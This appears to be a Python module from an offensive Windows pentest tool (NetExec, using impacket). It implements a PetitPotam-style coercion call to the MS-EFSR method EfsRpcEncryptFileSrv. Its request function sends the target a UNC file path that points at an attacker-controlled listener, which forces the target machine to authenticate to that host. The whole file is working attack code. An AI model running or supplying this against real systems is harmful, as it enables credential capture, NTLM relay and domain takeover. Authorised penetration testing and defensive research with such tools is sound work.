from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class EfsRpcEncryptFileSrv(NDRCALL):
    """Structure to make the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 4
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
    )


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcEncryptFileSrv()
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)